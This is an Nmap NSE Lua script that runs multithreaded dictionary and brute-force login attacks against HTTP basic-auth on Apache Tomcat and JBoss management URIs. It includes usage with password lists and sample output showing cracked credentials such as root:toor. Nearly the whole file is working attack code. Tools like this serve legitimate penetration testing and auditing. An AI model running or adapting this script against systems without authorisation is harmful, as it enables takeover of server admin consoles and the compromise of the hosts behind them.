local shortport = require "shortport"
local http = require "http"
local stdnse = require "stdnse"
local brute = require "brute"
local creds = require "creds"

description = [[
Performs a dictionary/bruteforce attack over login and password fields of Apache Tomcat default web management pages.
]]

---
-- @usage
-- ./nmap --script http-tomcat-manager --script-args 'brute.firstonly=false,threads=8,passdb=tomcat-passdb.txt,userdb=tomcat-userdb.txt' 192.168.1.23
--
-- @output
-- PORT     STATE SERVICE
-- 631/tcp  open  ipp
-- 8080/tcp open  http-proxy
-- | http-tomcat-manager: 
-- |   Accounts: 
-- |     admtomcatin:OvW*busr1 - URI=/manager/html STATUS=200
-- |_    root:toor - URI=/manager/html STATUS=200
-- 
--
-- @args hostname Sets hostname header.
-- @args threads Sets number of concurrent threads. Default: 3
--
-- Other useful arguments when using this script are:
-- * http.useragent = String - User Agent used in HTTP requests
-- * brute.firstonly = Boolean - Stop attack when the first credentials are found
-- * brute.mode = user/creds/pass - Username password iterator
-- * passdb = String - Path to password list
-- * userdb = String - Path to user list
---

author = "Julien Deudon (initbrain)"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"default", "auth", "intrusive"}

portrule = shortport.http

local DEFAULT_THREAD_NUM = 3

---
--This class implements the Driver class from the Brute library
---
Driver = {
  new = function(self, host, port, uri, options)
    local o = {}
    setmetatable(o, self)
    self.__index = self
    o.host = nmap.registry.args['hostname'] or host
    o.port = port
    o.uri = uri
    o.options = options
    return o
  end,

  connect = function( self )
    return true
  end,

  login = function(self, username, password)
    local credentials = {username = username, password = password}
    local response = http.get(self.host, self.port, self.uri, {auth = credentials, no_cache = true})
    stdnse.print_debug(2, "HTTP GET %s%s returned status %d", self.host, self.uri, response.status)
    if response.status ~= 401 and response.status ~= 403 and response.status ~= 404 then
      if (not( nmap.registry['credentials'])) then
        nmap.registry['credentials'] = {}
      end
      if (not( nmap.registry.credentials['http'])) then
        nmap.registry.credentials['http'] = {}
      end

      table.insert(nmap.registry.credentials.http, {username = username, password = password})
      return true, creds.Account:new(username, password, "URI=" .. self.uri .. " STATUS=" .. response.status)
    end
    return false, brute.Error:new("Incorrect password")
  end,

  disconnect = function( self ) 
    return true
  end,

  check = function( self )
    local response = http.get(self.host, self.port, self.uri)
    stdnse.print_debug(1, "HTTP GET %s%s", stdnse.get_hostname(self.host),self.uri)			
    -- Check if www-authenticate field is there
    if response.status == 401 and response.header["www-authenticate"] then
      stdnse.print_debug(1, "Initial check passed. Launching brute force attack")
      return true
    else
      stdnse.print_debug(1, "Initial check failed. www-authenticate header wasn't found")
    end
   return false
  end	
}
---
--MAIN
---
function table.removekey(table, key)
    local element = table[key]
    table[key] = nil
    return element
end

action = function(host, port)
  local status, engine, result
  local thread_num = nmap.registry["threads"] or DEFAULT_THREAD_NUM

  -- TODO get URIs form a file with the NSE script parameter "uridb" like "userdb" and "passdb"
  uriTable = {'/status', '/admin', '/web-console', '/jmx-console', '/admin-console', '/manager/html', '/tomcat/manager/html', '/host-manager/html', '/server-manager/html', '/web-console/Invoker', '/jmx-console/HtmlAdaptor', '/invoker/JMXInvokerServlet'}
  for i, uri in ipairs(uriTable) do
    local resultpart
    engine = brute.Engine:new(Driver, host, port, uri)
    engine:setMaxThreads(thread_num)
    engine.options.script_name = SCRIPT_NAME
    status, result = engine:start()
  end

  -- False statistics due to the URI iterator...
  if result ~= nil then
    table.removekey(result, "Statistics")
  end

  return result
end
